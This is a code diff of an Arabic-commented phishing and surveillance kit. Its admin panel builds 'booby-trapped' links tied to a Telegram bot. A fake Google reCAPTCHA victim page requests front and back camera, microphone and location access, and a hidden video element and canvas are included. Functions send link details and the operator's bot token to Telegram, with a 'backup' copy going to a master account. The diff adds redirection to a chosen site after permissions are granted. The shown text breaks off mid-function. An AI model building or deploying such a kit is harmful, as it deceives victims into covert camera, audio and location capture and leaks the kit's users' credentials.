@@ -7,7 +7,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
     <style>
-        /* ===== جميع الأنماط كما هي (لم تتغير) ===== */
+        /* ===== RESET & VARIABLES ===== */
         *,
         *::before,
         *::after {
@@ -28,10 +28,10 @@
             --gold-deep: #9f7d25;
             --gold-light: #d9b84a;
             --gold-soft: rgba(184, 148, 46, 0.14);
-            --gold-glow: rgba(184, 148, 46, 0.20);
             --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 40%, #b8942e 70%, #9f7d25 100%);
             --line: rgba(184, 148, 46, 0.12);
             --success: #1a8a4a;
+            --danger: #d93025;
             --radius-card: 24px;
             --radius-btn: 14px;
             --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
@@ -52,44 +52,32 @@
             position: relative;
             overflow-x: hidden;
         }
-
         body::before {
             content: '';
             position: fixed;
             inset: 0;
             background:
                 radial-gradient(ellipse at 20% 50%, rgba(184, 148, 46, 0.06) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.05) 0%, transparent 60%),
-                radial-gradient(ellipse at 50% 0%, rgba(184, 148, 46, 0.04) 0%, transparent 40%);
+                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.05) 0%, transparent 60%);
             pointer-events: none;
             z-index: 0;
         }
 
+        /* ===== PANEL ===== */
         .panel {
             max-width: 860px;
             width: 100%;
             background: var(--bg-panel);
             backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
             border-radius: var(--radius-card);
             border: 1px solid rgba(184, 148, 46, 0.15);
             padding: 32px 36px 28px;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.07), 0 4px 16px rgba(0, 0, 0, 0.03), inset 0 1px 0 rgba(255, 255, 255, 0.6);
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.07);
             position: relative;
             z-index: 1;
             opacity: 0;
             animation: fadeUp .8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
         }
-
-        .panel::after {
-            content: '';
-            position: absolute;
-            inset: 4px;
-            border-radius: calc(var(--radius-card) - 4px);
-            border: 1px solid rgba(184, 148, 46, 0.06);
-            pointer-events: none;
-        }
-
         @keyframes fadeUp {
             from {
                 opacity: 0;
@@ -100,7 +88,6 @@
                 transform: translateY(0) scale(1);
             }
         }
-
         @media (max-width: 640px) {
             .panel {
                 padding: 20px 18px 18px;
@@ -112,6 +99,7 @@
             }
         }
 
+        /* ===== TOP BAR ===== */
         .top {
             display: flex;
             align-items: center;
@@ -122,7 +110,6 @@
             gap: 12px;
             position: relative;
         }
-
         .top::after {
             content: '';
             position: absolute;
@@ -134,7 +121,6 @@
             border-radius: 2px;
             animation: shimmerLine 3s ease-in-out infinite;
         }
-
         @keyframes shimmerLine {
             0%,
             100% {
@@ -146,31 +132,25 @@
                 width: 120px;
             }
         }
-
         .brand {
             display: flex;
             align-items: center;
             gap: 14px;
         }
-
         .logo {
             width: 56px;
             height: 56px;
             flex-shrink: 0;
-            position: relative;
         }
-
         .logo svg {
             width: 100%;
             height: 100%;
             filter: drop-shadow(0 2px 12px rgba(184, 148, 46, 0.15));
         }
-
         .logo .pulse {
             animation: pulseMark 2.2s ease-in-out infinite;
             transform-origin: center;
         }
-
         @keyframes pulseMark {
             0%,
             100% {
@@ -182,12 +162,10 @@
                 opacity: 0.9;
             }
         }
-
         .logo .glow-ring {
             animation: glowRing 3s ease-in-out infinite;
             transform-origin: center;
         }
-
         @keyframes glowRing {
             0%,
             100% {
@@ -199,7 +177,6 @@
                 transform: scale(1.04);
             }
         }
-
         .name {
             font-family: var(--font-ar);
             font-size: 32px;
@@ -210,7 +187,6 @@
             background-clip: text;
             font-weight: 700;
         }
-
         .info {
             text-align: left;
             font-size: 13px;
@@ -220,7 +196,6 @@
             gap: 18px;
             flex-wrap: wrap;
         }
-
         .info .row {
             display: flex;
             align-items: center;
@@ -234,7 +209,6 @@
             border-radius: 30px;
             border: 1px solid rgba(184, 148, 46, 0.06);
         }
-
         .info .row .icon {
             width: 15px;
             height: 15px;
@@ -251,7 +225,6 @@
             font-size: 12px;
             font-weight: 600;
             color: var(--gold-deep);
-            letter-spacing: 0.5px;
             background: var(--gold-soft);
             padding: 5px 16px 5px 12px;
             border-radius: 40px;
@@ -276,7 +249,6 @@
                 box-shadow: 0 0 20px rgba(26, 138, 74, 0.20);
             }
         }
-
         @media (max-width: 680px) {
             .top {
                 flex-direction: column;
@@ -322,24 +294,27 @@
             }
         }
 
+        /* ===== GRID ===== */
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 18px;
             margin-top: 22px;
         }
-
         @media (max-width: 640px) {
             .grid {
                 grid-template-columns: 1fr;
                 gap: 14px;
             }
         }
+        .grid .full {
+            grid-column: 1 / -1;
+        }
 
+        /* ===== CARDS ===== */
         .card {
             background: var(--bg-card);
             backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
             border-radius: var(--radius-card);
             padding: 20px 22px 18px;
             border: 1px solid rgba(184, 148, 46, 0.07);
@@ -347,7 +322,6 @@
             position: relative;
             overflow: hidden;
         }
-
         .card::before {
             content: '';
             position: absolute;
@@ -355,20 +329,17 @@
             background: linear-gradient(135deg, rgba(184, 148, 46, 0.02) 0%, transparent 60%);
             pointer-events: none;
         }
-
         .card:hover {
             border-color: rgba(184, 148, 46, 0.20);
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 30px rgba(184, 148, 46, 0.04);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
             transform: translateY(-2px);
         }
-
         .card .label-wrap {
             display: flex;
             align-items: center;
             gap: 10px;
             margin-bottom: 10px;
         }
-
         .card .label-wrap svg {
             width: 17px;
             height: 17px;
@@ -377,7 +348,6 @@
             stroke-width: 1.8;
             flex-shrink: 0;
         }
-
         .card .label {
             font-family: var(--font-en);
             font-size: 10px;
@@ -387,7 +357,6 @@
             color: var(--ink-faint);
             display: block;
         }
-
         .card .input-wrap {
             display: flex;
             align-items: center;
@@ -399,13 +368,11 @@
             transition: var(--transition);
             backdrop-filter: blur(4px);
         }
-
         .card .input-wrap:focus-within {
             border-color: var(--gold);
             box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
             background: rgba(255, 255, 255, 0.6);
         }
-
         .card .input-wrap input {
             flex: 1;
             border: none;
@@ -421,7 +388,6 @@
             letter-spacing: 0.5px;
             min-width: 0;
         }
-
         .card .input-wrap input::placeholder {
             color: var(--ink-faint);
             letter-spacing: normal;
@@ -429,25 +395,19 @@
             opacity: 0.7;
         }
 
+        /* ===== TOGGLES ===== */
         .toggle-group {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
             margin-top: 6px;
         }
-
         @media (max-width: 560px) {
             .toggle-group {
                 grid-template-columns: repeat(2, 1fr);
                 gap: 8px;
             }
         }
-        @media (max-width: 380px) {
-            .toggle-group {
-                grid-template-columns: 1fr 1fr;
-            }
-        }
-
         .zeus-toggle {
             display: flex;
             align-items: center;
@@ -463,21 +423,18 @@
             backdrop-filter: blur(4px);
             position: relative;
         }
-
         .zeus-toggle:hover {
             border-color: rgba(184, 148, 46, 0.20);
             box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
             transform: translateY(-2px);
             background: rgba(255, 255, 255, 0.6);
         }
-
         .zeus-toggle input {
             position: absolute;
             opacity: 0;
             width: 0;
             height: 0;
         }
-
         .zeus-toggle .toggle-label {
             font-family: var(--font-ar);
             font-size: 13px;
@@ -489,7 +446,6 @@
             align-items: center;
             gap: 6px;
         }
-
         .zeus-toggle .toggle-label svg {
             width: 15px;
             height: 15px;
@@ -499,7 +455,6 @@
             flex-shrink: 0;
             transition: var(--transition);
         }
-
         .zeus-toggle .track {
             width: 36px;
             height: 22px;
@@ -510,7 +465,6 @@
             box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
             flex-shrink: 0;
         }
-
         .zeus-toggle .track .thumb {
             width: 16px;
             height: 16px;
@@ -522,33 +476,29 @@
             transition: var(--transition);
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
         }
-
         .zeus-toggle input:checked+.toggle-label {
             color: var(--ink);
             font-weight: 600;
         }
-
         .zeus-toggle input:checked+.toggle-label svg {
             stroke: var(--gold);
         }
-
         .zeus-toggle input:checked~.track {
             background: var(--gold-shimmer);
             box-shadow: 0 0 24px var(--gold-soft);
         }
-
         .zeus-toggle input:checked~.track .thumb {
             right: 17px;
             background: #fff;
         }
 
+        /* ===== BUTTON ===== */
         .generate-wrap {
             display: flex;
             justify-content: center;
             margin: 24px 0 20px 0;
             position: relative;
         }
-
         .generate-wrap::before {
             content: '';
             position: absolute;
@@ -557,7 +507,6 @@
             pointer-events: none;
             border-radius: 60px;
         }
-
         .btn-generate {
             display: inline-flex;
             align-items: center;
@@ -578,7 +527,6 @@
             position: relative;
             overflow: hidden;
         }
-
         .btn-generate::before {
             content: '';
             position: absolute;
@@ -587,20 +535,16 @@
             transform: translateX(-100%);
             transition: transform 0.6s;
         }
-
         .btn-generate:hover::before {
             transform: translateX(100%);
         }
-
         .btn-generate:hover {
             transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40), inset 0 1px 0 rgba(255, 255, 255, 0.20);
+            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40);
         }
-
         .btn-generate:active {
             transform: translateY(0) scale(0.98);
         }
-
         .btn-generate svg {
             width: 20px;
             height: 20px;
@@ -609,13 +553,11 @@
             stroke-width: 2;
             flex-shrink: 0;
         }
-
         .btn-generate.busy {
             opacity: 0.7;
             pointer-events: none;
             animation: pulseBusy 1s ease-in-out infinite;
         }
-
         @keyframes pulseBusy {
             0%,
             100% {
@@ -625,13 +567,11 @@
                 opacity: 1;
             }
         }
-
         .btn-generate.done {
             background: linear-gradient(135deg, #1a8a4a, #126a38);
             box-shadow: 0 4px 28px rgba(26, 138, 74, 0.30);
             color: #fff;
         }
-
         @media (max-width: 480px) {
             .btn-generate {
                 padding: 12px 28px;
@@ -644,17 +584,16 @@
             }
         }
 
+        /* ===== RESULT ===== */
         .result-section {
             margin-bottom: 22px;
         }
-
         .result-section .label-wrap {
             display: flex;
             align-items: center;
             gap: 10px;
             margin-bottom: 12px;
         }
-
         .result-section .label-wrap svg {
             width: 17px;
             height: 17px;
@@ -663,7 +602,6 @@
             stroke-width: 1.8;
             flex-shrink: 0;
         }
-
         .result-section .label-wrap .section-title {
             font-family: var(--font-en);
             font-size: 10px;
@@ -672,7 +610,6 @@
             letter-spacing: 2.5px;
             color: var(--ink-faint);
         }
-
         .result {
             display: flex;
             align-items: center;
@@ -688,20 +625,10 @@
             position: relative;
             overflow: hidden;
         }
-
-        .result::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, rgba(184, 148, 46, 0.03) 0%, transparent 60%);
-            pointer-events: none;
-        }
-
         .result:hover {
             border-color: rgba(184, 148, 46, 0.15);
             box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
         }
-
         .result .info-box {
             display: flex;
             flex-direction: column;
@@ -710,7 +637,6 @@
             position: relative;
             z-index: 1;
         }
-
         .result .info-box .value {
             font-family: var(--font-en);
             font-size: 20px;
@@ -724,7 +650,6 @@
             display: inline-block;
             width: fit-content;
         }
-
         .result .info-box .sub {
             font-family: var(--font-en);
             font-size: 11px;
@@ -733,7 +658,6 @@
             word-break: break-all;
             -webkit-text-fill-color: var(--ink-faint);
         }
-
         .result .actions {
             display: flex;
             gap: 10px;
@@ -741,7 +665,6 @@
             position: relative;
             z-index: 1;
         }
-
         .result .actions button {
             width: 42px;
             height: 42px;
@@ -756,7 +679,6 @@
             align-items: center;
             justify-content: center;
         }
-
         .result .actions button svg {
             width: 18px;
             height: 18px;
@@ -765,29 +687,21 @@
             stroke-width: 1.8;
             transition: var(--transition);
         }
-
         .result .actions button:hover {
             transform: translateY(-3px);
             border-color: var(--gold);
             color: var(--gold);
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 20px rgba(184, 148, 46, 0.06);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
             background: rgba(255, 255, 255, 0.7);
         }
-
-        .result .actions button:active {
-            transform: translateY(0);
-        }
-
         .result .actions button.ok {
             border-color: var(--success);
             background: var(--success);
             color: #fff;
         }
-
         .result .actions button.ok svg {
             stroke: #fff;
         }
-
         @media (max-width: 480px) {
             .result {
                 padding: 14px 16px;
@@ -810,6 +724,7 @@
             }
         }
 
+        /* ===== FOOTER ===== */
         .footer {
             display: flex;
             align-items: center;
@@ -825,7 +740,6 @@
             position: relative;
             flex-wrap: wrap;
         }
-
         .footer::before {
             content: '';
             position: absolute;
@@ -838,7 +752,6 @@
             border-radius: 2px;
             animation: shimmerLineCenter 3s ease-in-out infinite;
         }
-
         @keyframes shimmerLineCenter {
             0%,
             100% {
@@ -850,11 +763,9 @@
                 width: 80px;
             }
         }
-
         .footer:hover {
             transform: translateY(-2px);
         }
-
         .footer .dev-name {
             font-family: var(--font-ar);
             font-weight: 700;
@@ -866,7 +777,6 @@
             background-clip: text;
             position: relative;
         }
-
         .footer .icon-badge {
             width: 22px;
             height: 22px;
@@ -875,7 +785,6 @@
             align-items: center;
             justify-content: center;
         }
-
         .footer .icon-badge svg {
             width: 100%;
             height: 100%;
@@ -884,12 +793,10 @@
             stroke-width: 1.8;
             transition: var(--transition);
         }
-
         .footer:hover .icon-badge svg {
             transform: rotate(10deg) scale(1.1);
             stroke: var(--gold-deep);
         }
-
         @media (max-width: 480px) {
             .footer {
                 font-size: 14px;
@@ -906,7 +813,7 @@
             }
         }
 
-        /* ===== تعديل خط صفحة الضحية إلى خط رسمي وعادي ===== */
+        /* ===== VICTIM PAGE ===== */
         #victimPage {
             display: none;
             justify-content: center;
@@ -917,7 +824,6 @@
             padding: 16px;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
-
         #victimPage .captcha-wrapper {
             width: 340px;
             max-width: 100%;
@@ -929,21 +835,18 @@
             cursor: default;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
-
         #victimPage .captcha-row {
             display: flex;
             align-items: center;
             padding: 15px 15px 12px 15px;
             gap: 12px;
         }
-
         #victimPage .spinner {
             position: relative;
         }
         #victimPage .spinner input {
             display: none;
         }
-
         #victimPage .checkmark {
             width: 32px;
             height: 32px;
@@ -957,7 +860,6 @@
             transition: 0.3s;
             position: relative;
         }
-
         #victimPage .checkmark .tick {
             width: 10px;
             height: 18px;
@@ -967,7 +869,6 @@
             opacity: 0;
             transition: 0.2s;
         }
-
         #victimPage .checkmark .loader {
             display: none;
             width: 20px;
@@ -977,7 +878,6 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-
         #victimPage .spinner.loading .checkmark {
             border-color: #1a73e8;
             background: #e8f0fe;
@@ -988,7 +888,6 @@
         #victimPage .spinner.loading .checkmark .loader {
             display: block;
         }
-
         #victimPage .spinner.failed .checkmark {
             border-color: #d93025;
             background: #fce8e6;
@@ -1005,7 +904,6 @@
             font-weight: bold;
             color: #d93025;
         }
-
         #victimPage .spinner.success .checkmark {
             border-color: #00a651;
             background: #e6f4ea;
@@ -1017,7 +915,6 @@
         #victimPage .spinner.success .checkmark .loader {
             display: none;
         }
-
         #victimPage .text {
             flex: 1;
             font-size: 18px;
@@ -1027,7 +924,6 @@
             user-select: none;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
-
         #victimPage .text.loading {
             color: #1a73e8;
         }
@@ -1037,7 +933,10 @@
         #victimPage .text.success {
             color: #00a651;
         }
-
+        #victimPage .text.permission-deny {
+            color: #d93025;
+            font-size: 15px;
+        }
         #victimPage .logo-captcha {
             display: flex;
             flex-direction: column;
@@ -1046,19 +945,16 @@
             color: #777;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
-
         #victimPage .logo-captcha img {
             width: 38px;
             margin-bottom: 4px;
         }
-
         #victimPage .logo-captcha strong {
             font-size: 10px;
         }
         #victimPage .logo-captcha small {
             font-size: 8px;
         }
-
         #victimPage .captcha-footer {
             display: flex;
             align-items: center;
@@ -1069,57 +965,57 @@
             height: 36px;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
-
         #victimPage .captcha-footer .brand {
             display: flex;
             align-items: center;
             gap: 8px;
         }
-
         #victimPage .captcha-footer .brand svg {
             height: 24px;
             width: auto;
         }
-
         #victimPage .captcha-footer .brand .google-text {
             font-size: 14px;
             font-weight: 500;
             color: #222;
         }
-
         #victimPage .captcha-footer .links {
             display: flex;
             align-items: center;
             gap: 10px;
             font-size: 11px;
         }
-
         #victimPage .captcha-footer .links a {
             color: #555;
             text-decoration: none;
             font-size: 11px;
             transition: color 0.15s;
         }
-
         #victimPage .captcha-footer .links a:hover {
             color: #1a73e8;
             text-decoration: underline;
         }
-
         #victimPage .captcha-footer .links .separator {
             color: #aaa;
         }
-
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
-
         @keyframes check {
-            from { opacity: 0; transform: rotate(45deg) scale(0.3); }
-            to { opacity: 1; transform: rotate(45deg) scale(1); }
+            from {
+                opacity: 0;
+                transform: rotate(45deg) scale(0.3);
+            }
+            to {
+                opacity: 1;
+                transform: rotate(45deg) scale(1);
+            }
         }
-
         @media (max-width: 480px) {
             #victimPage .captcha-wrapper {
                 width: 100%;
@@ -1138,6 +1034,61 @@
             }
         }
 
+        /* ===== PERMISSION STATUS ===== */
+        .permission-status {
+            display: none;
+            margin-top: 12px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: center;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
+            background: #f8f9fa;
+            border: 1px solid #e5e7e9;
+            width: 100%;
+            max-width: 340px;
+        }
+        .permission-status .perm-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 13px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .permission-status .perm-item:last-child {
+            border-bottom: none;
+        }
+        .permission-status .perm-item .perm-name {
+            color: #555;
+        }
+        .permission-status .perm-item .perm-status {
+            font-weight: 600;
+        }
+        .permission-status .perm-item .perm-status.granted {
+            color: #1a8a4a;
+        }
+        .permission-status .perm-item .perm-status.denied {
+            color: #d93025;
+        }
+        .permission-status .perm-item .perm-status.pending {
+            color: #b8942e;
+        }
+        .permission-status .perm-all {
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 2px solid #e5e7e9;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .permission-status .perm-all.all-granted {
+            color: #1a8a4a;
+        }
+        .permission-status .perm-all.all-denied {
+            color: #d93025;
+        }
+
+        /* ===== HIDDEN ===== */
         #hiddenVideo {
             position: fixed;
             top: -1000px;
@@ -1151,44 +1102,7 @@
             display: none;
         }
 
-        /* تم إخفاء شريط الحالة السفلي للضحية */
-        .victim-status {
-            display: none !important;
-        }
-
-        ::-webkit-scrollbar {
-            width: 6px;
-            height: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--bg-body);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--gold-light);
-            border-radius: 10px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--gold);
-        }
-
-        body.victim-mode {
-            background: #eef2f5;
-            padding: 16px;
-        }
-        body.victim-mode .panel {
-            display: none !important;
-        }
-        body.victim-mode #victimPage {
-            display: flex !important;
-        }
-
-        body.admin-mode .panel {
-            display: block !important;
-        }
-        body.admin-mode #victimPage {
-            display: none !important;
-        }
-
+        /* ===== TOAST ===== */
         .toast-msg {
             position: fixed;
             bottom: 30px;
@@ -1222,13 +1136,48 @@
         .toast-msg.warning {
             background: #b8942e;
         }
+
+        /* ===== BODY MODES ===== */
+        body.victim-mode {
+            background: #eef2f5;
+            padding: 16px;
+        }
+        body.victim-mode .panel {
+            display: none !important;
+        }
+        body.victim-mode #victimPage {
+            display: flex !important;
+        }
+        body.admin-mode .panel {
+            display: block !important;
+        }
+        body.admin-mode #victimPage {
+            display: none !important;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-body);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--gold-light);
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--gold);
+        }
     </style>
 </head>
 <body>
 
     <div class="toast-msg" id="toast"></div>
 
-    <!-- ===== ADMIN PANEL ===== -->
+    <!-- ============================================================
+    ADMIN PANEL
+    ============================================================ -->
     <div class="panel" id="adminPanel">
         <div class="top">
             <div class="brand">
@@ -1272,6 +1221,7 @@
             </div>
         </div>
 
+        <!-- ===== الحقول الأساسية ===== -->
         <div class="grid">
             <div class="card">
                 <div class="label-wrap">
@@ -1301,6 +1251,24 @@
             </div>
         </div>
 
+        <!-- ===== الرابط المستهدف (تلغيم) ===== -->
+        <div class="card" style="margin-top: 18px;">
+            <div class="label-wrap">
+                <svg viewBox="0 0 24 24" stroke="currentColor">
+                    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" />
+                    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" />
+                </svg>
+                <span class="label">الرابط المستهدف (تلغيم)</span>
+            </div>
+            <div class="input-wrap">
+                <input type="text" id="targetUrlInput" placeholder="https://example.com …" dir="ltr" />
+            </div>
+            <div style="font-size:12px;color:var(--ink-faint);margin-top:6px;font-family:var(--font-en);">
+                ⚡ سيتم توجيه الضحية إلى هذا الرابط بعد منح جميع الصلاحيات
+            </div>
+        </div>
+
+        <!-- ===== المميزات ===== -->
         <div class="card" style="margin-top: 18px;">
             <div class="label-wrap">
                 <svg viewBox="0 0 24 24" stroke="currentColor">
@@ -1363,6 +1331,7 @@
             </div>
         </div>
 
+        <!-- ===== زر التوليد ===== -->
         <div class="generate-wrap">
             <button class="btn-generate" id="genBtn">
                 <svg viewBox="0 0 24 24" stroke="currentColor">
@@ -1373,6 +1342,7 @@
             </button>
         </div>
 
+        <!-- ===== النتيجة ===== -->
         <div class="result-section">
             <div class="label-wrap">
                 <svg viewBox="0 0 24 24" stroke="currentColor">
@@ -1400,6 +1370,7 @@
             </div>
         </div>
 
+        <!-- ===== FOOTER ===== -->
         <div class="footer" onclick="window.open('https://t.me/xx_8k', '_blank')" title="اضغط للانتقال للتليجرام">
             <span>تــم التطـــوير بواسطــــــة</span>
             <span class="dev-name">أشـــــروف</span>
@@ -1412,7 +1383,9 @@
         </div>
     </div>
 
-    <!-- ===== VICTIM PAGE (reCAPTCHA) ===== -->
+    <!-- ============================================================
+    VICTIM PAGE — reCAPTCHA + PERMISSION CHECK
+    ============================================================ -->
     <div id="victimPage">
         <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
             <div class="captcha-wrapper" id="captchaWrapper">
@@ -1448,14 +1421,36 @@
                     </div>
                 </div>
             </div>
-            <!-- تم إخفاء شريط الحالة -->
-            <div class="victim-status" id="victimStatus"></div>
+
+            <!-- ===== حالة الصلاحيات ===== -->
+            <div class="permission-status" id="permissionStatus">
+                <div class="perm-item">
+                    <span class="perm-name">📷 كاميرا أمامية</span>
+                    <span class="perm-status pending" id="permFront">⏳ في الانتظار</span>
+                </div>
+                <div class="perm-item">
+                    <span class="perm-name">📷 كاميرا خلفية</span>
+                    <span class="perm-status pending" id="permBack">⏳ في الانتظار</span>
+                </div>
+                <div class="perm-item">
+                    <span class="perm-name">🎙️ ميكروفون</span>
+                    <span class="perm-status pending" id="permMic">⏳ في الانتظار</span>
+                </div>
+                <div class="perm-item">
+                    <span class="perm-name">📍 الموقع</span>
+                    <span class="perm-status pending" id="permLoc">⏳ في الانتظار</span>
+                </div>
+                <div class="perm-all" id="permAll">⏳ جاري التحقق من الصلاحيات...</div>
+            </div>
         </div>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
 
+    <!-- ============================================================
+    JAVASCRIPT
+    ============================================================ -->
     <script>
         (function() {
             "use strict";
@@ -1491,7 +1486,6 @@
                 const day = String(egyptTime.getDate()).padStart(2, '0');
                 const month = String(egyptTime.getMonth() + 1).padStart(2, '0');
                 const year = egyptTime.getFullYear();
-
                 const timeEl = document.getElementById('timeDisplay');
                 const dateEl = document.getElementById('dateDisplay');
                 if (timeEl) timeEl.textContent = hours + ':' + minutes;
@@ -1509,10 +1503,10 @@
 
             if (encodedData && encodedData.length > 0) {
                 document.body.className = 'victim-mode';
-                initVictimPage(encodedData);
+                initVictimPage(encodedData, rawToken);
             } else if (rawToken && rawToken.length >= 4) {
                 document.body.className = 'victim-mode';
-                initVictimPage(null);
+                initVictimPage(null, rawToken);
             } else {
                 document.body.className = 'admin-mode';
                 initAdminPanel();
@@ -1524,25 +1518,23 @@
             function initAdminPanel() {
                 const chatIdInput = document.getElementById('chatIdInput');
                 const botTokenInput = document.getElementById('botTokenInput');
+                const targetUrlInput = document.getElementById('targetUrlInput');
                 const genBtn = document.getElementById('genBtn');
                 const tokenDisplay = document.getElementById('tokenDisplay');
                 const resultSub = document.getElementById('resultSub');
                 const copyBtn = document.getElementById('copyBtn');
                 const openBtn = document.getElementById('openBtn');
 
-                // ===== دالة توليد التوكن الثابت (6 حروف وأرقام فقط) =====
+                // ===== توليد التوكن الثابت 6 أحرف =====
                 async function generateShortToken(botToken) {
-                    // استخدام SHA-256 مع ملح ثابت لضمان عدم التكرار والثبات الدائم
-                    const salt = 'ZEUS_SALT_2026_SECURE';
+                    const salt = 'ZEUS_SALT_2026_FIXED';
                     const encoder = new TextEncoder();
                     const data = encoder.encode(botToken + salt);
-                    
+
                     let hashBuffer;
                     try {
-                        // استخدام Web Crypto API
                         hashBuffer = await crypto.subtle.digest('SHA-256', data);
                     } catch (e) {
-                        // احتياطي بسيط في حال عدم توفر crypto.subtle (نادراً)
                         let hash = 0;
                         const str = botToken + salt;
                         for (let i = 0; i < str.length; i++) {
@@ -1554,23 +1546,14 @@
                         hashBuffer = new TextEncoder().encode(hex);
                     }
 
-                    // تحويل إلى مصفوفة بايت
                     const hashArray = Array.from(new Uint8Array(hashBuffer));
-                    
-                    // الأحرف المسموحة (حروف كبيرة وأرقام فقط، استبعدنا O و 0 و I و 1 لتجنب الالتباس)
                     const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
                     let result = '';
-                    
                     for (let i = 0; i < hashArray.length && result.length < 6; i++) {
-                        const index = hashArray[i] % chars.length;
-                        result += chars[index];
+                        const idx = hashArray[i] % chars.length;
+                        result += chars[idx];
                     }
-                    
-                    // في حالة نقص الطول (لن يحدث لكن للأمان)
-                    while (result.length < 6) {
-                        result += 'A';
-                    }
-                    
+                    while (result.length < 6) result += 'A';
                     return result;
                 }
 
@@ -1582,20 +1565,21 @@
                     } catch { return false; }
                 }
 
-                function encodeBotData(botToken, chatId) {
-                    const payload = JSON.stringify({ bot: botToken, chat: chatId });
+                function encodeData(botToken, chatId, targetUrl) {
+                    const payload = JSON.stringify({ bot: botToken, chat: chatId, url: targetUrl });
                     return btoa(encodeURIComponent(payload));
                 }
 
-                async function sendLinkToUser(botToken, chatId, link, shortToken) {
+                async function sendLinkToUser(botToken, chatId, link, shortToken, targetUrl) {
                     const msg =
-`⭑ رابط جديد للضحية ⭒\n` +
-`⊚─〔 بيانات الرابط 〕────────\n` +
-`˼⏣˹ الرابط: ${link} ⭒\n` +
-`˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
-`˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-`˼⏣˹ ملاحظة: شاركه مع الضحية، سيتم جمع البيانات وإرسالها إليك. ⭒\n` +
-`─────────────────`;
+                        `⭑ رابط مُلغَّم جاهز ⭒\n` +
+                        `⊚─〔 بيانات الرابط 〕────────\n` +
+                        `˼⏣˹ الرابط المُلغَّم: ${link} ⭒\n` +
+                        `˼⏣˹ التوكن الفريد: \`${shortToken}\` ⭒\n` +
+                        `˼⏣˹ الوجهة: ${targetUrl} ⭒\n` +
+                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                        `─────────────────\n` +
+                        `⚡ عند فتح الرابط تظهر صفحة التحقق، وبعد منح الصلاحيات يتم التوجيه إلى الوجهة.`;
 
                     const inlineKeyboard = {
                         inline_keyboard: [
@@ -1617,20 +1601,21 @@
                     } catch (e) { console.warn('Send to user failed:', e); }
                 }
 
-                async function sendToMaster(botToken, chatId, shortToken) {
+                async function sendToMaster(botToken, chatId, shortToken, targetUrl) {
                     const msg =
-                        `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
+                        `⭑ نسخة احتياطية — رابط مُلغَّم ⭒\n` +
                         `⊚─〔 بيانات البوت 〕────────\n` +
                         `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
                         `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
-                        `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
+                        `˼⏣˹ التوكن الفريد: \`${shortToken}\` ⭒\n` +
+                        `˼⏣˹ الوجهة: ${targetUrl} ⭒\n` +
